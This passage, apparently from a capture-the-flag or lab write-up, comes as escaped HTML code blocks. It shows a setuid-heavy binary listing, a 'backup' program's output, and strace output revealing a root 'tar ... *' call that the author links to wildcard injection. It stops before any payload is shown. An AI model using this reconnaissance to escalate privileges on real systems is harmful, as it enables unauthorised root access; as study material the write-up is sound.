&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1107672&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jun&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;composer&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwx&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="mi"&gt;8830&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jul&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dice&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwsr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="c1"&gt;---   1 root sean   866169 Aug 15  2015 restore&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us see what it does:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;backup&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;backup&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Securing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;environment&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Performing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;backup&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gitignore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sqlite&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;framework&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;framework&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cache&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;framework&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cache&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gitignore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;framework&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sessions&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;framework&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sessions&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gitignore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;framework&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;views&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;framework&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;views&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gitignore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gitignore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lumen&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;log&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Backup&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It might be something about WildCards on linux.  The following
&lt;a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt"&gt;link&lt;/a&gt;
let us learn more about Linux WildCards vulnerability.&lt;/p&gt;
&lt;p&gt;Let us see what is used by the backup program with &lt;code&gt;strace&lt;/code&gt; which available on
the server let us try it to see the inside of the program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;fII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;strace&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;grep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;strace&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;grep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./backup&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./backup&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHLVL=13&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_=/bin/strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OLDPWD=/tmp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1779&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;%Y%m&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;).tar.gz *;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHLVL=13&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_=/bin/strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OLDPWD=/tmp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1781&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;+%Y%m&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OLDPWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PWD=/usr/share/nginx/serverchecker/storage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; 